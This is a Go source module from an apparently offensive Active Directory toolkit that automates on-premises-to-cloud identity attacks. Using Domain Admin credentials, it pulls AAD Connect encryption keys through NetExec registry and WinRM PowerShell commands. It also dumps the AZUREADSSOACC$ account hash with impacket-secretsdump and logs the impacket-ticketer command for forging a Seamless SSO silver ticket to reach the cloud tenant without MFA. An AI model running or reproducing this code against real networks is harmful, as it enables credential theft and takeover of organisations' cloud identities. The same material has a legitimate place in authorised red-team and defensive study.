package modules

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

func RunHybridBridge(state *core.ADState) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping hybrid bridge")
		return result
	}

	utils.Section("🌉", "Hybrid Bridge", "on-prem to cloud identity bridge analysis")
	slog.Info("hybrid bridge: executing on-prem to cloud convergence attacks")

	hasAADConnect := false
	hasSeamlessSSO := false

	for _, r := range state.CloudResources {
		props := strings.ToLower(r.Properties)
		if r.Type == "service_principal" && strings.Contains(props, "aad connect") {
			hasAADConnect = true
		}
		if r.Type == "service_principal" && strings.Contains(props, "seamless sso") {
			hasSeamlessSSO = true
		}
	}

	daCreds := extractDACreds(state)
	utils.StepInfo(fmt.Sprintf("DA credentials available: %d", len(daCreds)))
	if len(daCreds) == 0 {
		slog.Warn("hybrid bridge: no DA creds — convergence attacks require Domain Admin")
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvUserEnumerated, Phase: core.PhaseHybridBridge,
			Source: "hybrid_bridge", Key: "no_da",
			Value:      "DA creds required for AADConnect extraction and SeamlessSSO attacks",
			Confidence: 1.0, Timestamp: time.Now(),
		})
		return result
	}

	attackCount := 0

	if hasAADConnect {
		utils.Attempt("🔄", "AAD Connect", "extracting AAD Connect credentials")
		if extractAADConnectCreds(state, daCreds, result) {
			attackCount++
		}
	} else {
		slog.Info("hybrid bridge: AAD Connect not detected — skipping credential extraction")
	}

	if hasSeamlessSSO {
		utils.Attempt("🎫", "Seamless SSO", "forging Seamless SSO silver ticket")
		if forgeSeamlessSSOTicket(state, daCreds, result) {
			attackCount++
		}
	} else {
		slog.Info("hybrid bridge: Seamless SSO not detected — skipping ticket forge")
	}

	if attackCount == 0 {
		slog.Warn("hybrid bridge: no attacks executed")
		utils.StepWarn("No hybrid bridge attacks executed")
	} else {
		slog.Info("hybrid bridge: attacks completed", "count", attackCount)
		utils.StepOk(fmt.Sprintf("Hybrid bridge: %d attack(s) completed", attackCount))
	}

	slog.Info("hybrid bridge phase complete")
	return result
}

func pickFirstCred(creds []credWithHost) credWithHost {
	for _, c := range creds {
		if c.Secret != "" {
			return c
		}
		if c.Hash != "" {
			return c
		}
	}
	if len(creds) > 0 {
		return creds[0]
	}
	return credWithHost{}
}

func extractAADConnectCreds(state *core.ADState, daCreds []credWithHost, result *core.ToolResult) bool {
	cred := pickFirstCred(daCreds)
	if cred.Host == "" {
		slog.Warn("hybrid bridge: no DC target for AADConnect extraction")
		return false
	}
	utils.Attempt("🔄", cred.Host, "extracting AAD Connect registry keys")

	lootDir := LootDir
	if lootDir == "" {
		lootDir = filepath.Join(os.TempDir(), "adpack-hybrid")
	}
	lootDir = filepath.Join(lootDir, fmt.Sprintf("hybrid_%d", time.Now().Unix()))
	if err := os.MkdirAll(lootDir, 0700); err != nil {
		slog.Error("hybrid bridge: create loot dir", "error", err)
		return false
	}

	slog.Info("hybrid bridge: extracting AAD Connect credentials via nxc registry",
		"dc", cred.Host)

	nt := tools.NetExecTarget{
		Protocol: "smb", Host: cred.Host,
		Domain: cred.Domain, Username: cred.Username,
		Password: cred.Secret, Hash: cred.Hash,
	}

	regKeys := []string{
		`"HKLM\SOFTWARE\Azure AD Connect\EncryptionKey\EncryptionKeys"`,
		`"HKLM\SOFTWARE\Microsoft\ADHybridAgent\TenantId"`,
	}
	foundAny := false
	for _, key := range regKeys {
		r, err := tools.NetExec.Run(context.Background(), nt, "--registry", []string{"-x", key})
		if err == nil && r.Success && r.Stdout != "" {
			keyName := strings.ReplaceAll(key, `\`, "_")
			keyName = strings.ReplaceAll(keyName, `"`, "")
			outPath := filepath.Join(lootDir, fmt.Sprintf("aadconnect_%s.txt", keyName))
			os.WriteFile(outPath, []byte(r.Stdout), 0600)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseHybridBridge,
				Source: "aadconnect_reg", Key: key,
				Value:      outPath,
				Confidence: 0.7, Timestamp: time.Now(),
			})
			foundAny = true
			slog.Info("hybrid bridge: AAD Connect registry key extracted", "key", key)
		}
	}

	if !foundAny {
		slog.Warn("hybrid bridge: AAD Connect extraction via registry failed — trying WinRM")
		nt := tools.NetExecTarget{
			Protocol: "winrm", Host: cred.Host,
			Domain: cred.Domain, Username: cred.Username,
			Password: cred.Secret, Hash: cred.Hash,
		}
		r, err := tools.NetExec.Run(context.Background(), nt, "-x", []string{
			`powershell -NoP -NonI -C "Get-ChildItem 'HKLM:\SOFTWARE\Azure AD Connect\EncryptionKey' -Recurse 2>$null | Select Name,Value; Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\ADHybridAgent' 2>$null | Select TenantId"`,
		})
		if err == nil && r.Success && r.Stdout != "" {
			outPath := filepath.Join(lootDir, "aadconnect_winrm.txt")
			os.WriteFile(outPath, []byte(r.Stdout), 0600)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseHybridBridge,
				Source: "aadconnect_winrm", Key: "aadconnect_extract",
				Value:      outPath,
				Confidence: 0.7, Timestamp: time.Now(),
			})
			foundAny = true
		}
	}

	if foundAny {
		slog.Warn("hybrid bridge: AAD Connect credentials may be usable for cloud GA — check extracted keys with roadrecon or AADInternals")
		utils.StepOk("AAD Connect credentials extracted")
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhaseHybridBridge,
			Source: "aadconnect", Key: "methodology",
			Value:      "AAD Connect MSOL_/Sync_ creds can authenticate as GA in the cloud tenant",
			Confidence: 0.8, Timestamp: time.Now(),
		})
		return true
	}

	slog.Warn("hybrid bridge: AAD Connect extraction failed")
	utils.StepWarn("AAD Connect extraction failed")
	return false
}

func forgeSeamlessSSOTicket(state *core.ADState, daCreds []credWithHost, result *core.ToolResult) bool {
	cred := pickFirstCred(daCreds)
	if cred.Host == "" {
		slog.Warn("hybrid bridge: no DC target for SeamlessSSO")
		return false
	}
	utils.Attempt("🎫", cred.Host, "extracting AZUREADSSOACC$ computer hash")

	lootDir := LootDir
	if lootDir == "" {
		lootDir = filepath.Join(os.TempDir(), "adpack-hybrid")
	}
	lootDir = filepath.Join(lootDir, fmt.Sprintf("hybrid_%d", time.Now().Unix()))
	os.MkdirAll(lootDir, 0700)

	slog.Info("hybrid bridge: extracting AZUREADSSOACC$ computer hash for SeamlessSSO silver ticket",
		"dc", cred.Host)

	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
		slog.Warn("hybrid bridge: impacket-secretsdump not found — skipping SeamlessSSO")
		return false
	}
	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
		slog.Warn("hybrid bridge: impacket-ticketer not found — skipping SeamlessSSO")
		return false
	}

	authSpec := buildImpacketAuth(cred.Domain, cred.Username, cred.Secret, cred.Hash, cred.Host)
	args := append([]string{authSpec, "-just-dc-user", "AZUREADSSOACC$"}, impacketHashArgs(cred.Hash)...)

	r := utils.RunCommandTimeout(3*time.Minute, "impacket-secretsdump", args)
	if !r.Success {
		slog.Warn("hybrid bridge: AZUREADSSOACC$ extraction failed", "error", r.Stderr)
		return false
	}

	outPath := filepath.Join(lootDir, "azureadssoacc_hash.txt")
	os.WriteFile(outPath, []byte(r.Stdout), 0600)

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseHybridBridge,
		Source: "secretsdump_azureadssoacc", Key: "AZUREADSSOACC$",
		Value:      outPath,
		Confidence: 0.8, Timestamp: time.Now(),
	})
	slog.Warn("hybrid bridge: AZUREADSSOACC$ hash extracted — forge Silver Ticket with: impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <domain.onmicrosoft.com> -spn azuread/sso Administrator")
	slog.Warn("hybrid bridge: SeamlessSSO silver ticket grants cloud access from any domain-joined machine")

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhaseHybridBridge,
		Source: "seamless_sso", Key: "methodology",
		Value:      "AZUREADSSOACC$ hash extracted — forge Silver Ticket with -spn azuread/sso for cloud auth without MFA",
		Confidence: 0.8, Timestamp: time.Now(),
	})
	return true
}
